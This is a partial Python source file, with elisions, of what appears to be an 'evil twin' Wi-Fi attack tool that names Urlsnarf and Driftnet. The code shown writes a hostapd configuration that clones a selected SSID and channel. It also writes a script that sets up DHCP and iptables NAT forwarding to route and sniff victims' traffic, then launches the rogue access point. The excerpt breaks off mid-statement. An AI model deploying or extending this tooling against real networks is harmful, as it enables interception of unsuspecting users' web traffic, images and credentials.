...
class apObj(object):
    ...
    def showLogo(self):
        ...
        print(evilTwinLogo)
        startupInfo = returnGreenDeep(COL,"Developed by ANJEESHNU , Using Urlsnarf, Driftnet and more. 2021-2021.")
    ...
    def setupConfigFiles(self):
        if self.apHostMethod == "Hostapd":
            ...
            bashRun("echo 'ifconfig {} 192.168.{}.{} netmask 255.255.255.0' >> ~/.godseye/traffic-sniff.sh".format(self.apHostCard,self.subnetPart2,self.apAddr))
            bashRun("echo 'dhcpd {}' >> ~/.godseye/traffic-sniff.sh".format(self.apHostCard))
            ...
            bashRun("echo 'iptables --table nat --append POSTROUTING --out-interface {} -j MASQUERADE' >> ~/.godseye/traffic-sniff.sh".format(self.inetFaceCard))
            bashRun("echo 'iptables --append FORWARD -j ACCEPT --in-interface {}' >> ~/.godseye/traffic-sniff.sh".format(self.apHostCard))
            ...
            bashRun("echo 'interface={}' >> ~/.godseye/hostapd.conf".format(self.apHostCard))
            bashRun("echo 'driver=nl80211' >> ~/.godseye/hostapd.conf")
            bashRun("echo 'ssid={}' >> ~/.godseye/hostapd.conf".format(self.selectedSSID))
            bashRun("echo 'channel={}' >> ~/.godseye/hostapd.conf".format(self.channelNum))
            ...
            bashRun("echo 'ifconfig at0 192.168.{}.{} netmask 255.255.255.0' >> ~/.godseye/traffic-sniff.sh".format(self.subnetPart2,self.apAddr))
    ...
    def hostFakeAp(self):
        ...
        if self.apHostMethod == "Hostapd":
            self.finalCommand += ("sh ~/.godseye/traffic-sniff.sh"
            " & xterm -hold -geometry -7640 -title "
            "'Hosting AP, CTRL+C or close all windows to exit' -bg '#FFFFFF'"
            " -fg '#000000' -e 'hostapd ~/.godseye/hostapd.conf' & ")
            self.tapInterface = self.apHostCard
        elif self.apHostMethod == "Airbase-ng":
            self.finalCommand += ("sh ~/.godseye/traffic-sniff.sh & xterm"
